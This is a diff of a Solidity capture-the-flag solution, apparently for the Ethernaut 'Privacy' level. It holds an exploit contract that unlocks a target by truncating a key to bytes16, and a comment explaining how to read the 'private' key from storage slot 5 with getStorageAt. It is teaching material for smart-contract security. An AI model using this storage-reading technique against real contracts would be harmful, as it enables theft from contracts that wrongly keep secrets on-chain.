@@ -4,35 +4,32 @@ pragma solidity ^0.8.0; // Latest solidity version
 import '../contracts/Privacy.sol';
 
 contract HackPrivacy {
-    Privacy public originalContract = Privacy(0xabeB484Aa5db9407828f83fF80F432c715DD3181);
-    bytes32 stor4;
-    bytes16 unlocker;
+    // Complete with the instance's address
+    Privacy public originalContract = Privacy(0x550945DBEBd70Fb4afD2c64476d7Dd9B99FA20dB);
 
-    function hack(bytes32 pass, bool zero) public {
-        stor4 = pass;
-        if (zero) {
-            unlocker = transformTo16(stor4);
-        } else {
-            unlocker = transformTo16two(stor4);
-        }
-        originalContract.unlock(unlocker);
-    }
-
-    function transformTo16(bytes32 source) internal pure returns (bytes16) {
-        bytes16[2] memory y = [bytes16(0), 0];
-        assembly {
-            mstore(y, source)
-            mstore(add(y, 16), source)
-        }
-        return y[0];
-    }
-
-    function transformTo16two(bytes32 source) internal pure returns (bytes16) {
-        bytes16[2] memory y = [bytes16(0), 0];
-        assembly {
-            mstore(y, source)
-            mstore(add(y, 16), source)
-        }
-        return y[1];
+    function hack(bytes32 pass) public {
+        originalContract.unlock(bytes16(pass));
     }
 }
+
+/*
+    The first thing you need to do is to go throw the storage until you find the key
+    This way you're going to find the key in a bytes32 format
+    -await web3.eth.getStorageAt(instance, 5, console.log)
+
+    Why slot 5 of the storage?
+    Well, in the slot 0 you're gonna find the boolean locked
+    Into the slot 1 you're gonna find the two uint8
+    Into the slot 2 you're gonna find the uint16
+
+    The array of bytes32 has a length of 3, and we need the third one.
+    Why the third one? Because the key is created from the bytes32 in the position 2 of the array.
+    The positions starts at 0, so the third one is at position 2.
+
+    Into the slot 3 you're gonna find the first bytes32
+    Into the slot 4 you're gonna find the second bytes32
+    Into the slot 5 you're gonna find the third bytes32
+
+    Pass the slot 5 as key and you're gonna complete the level
+
+*/
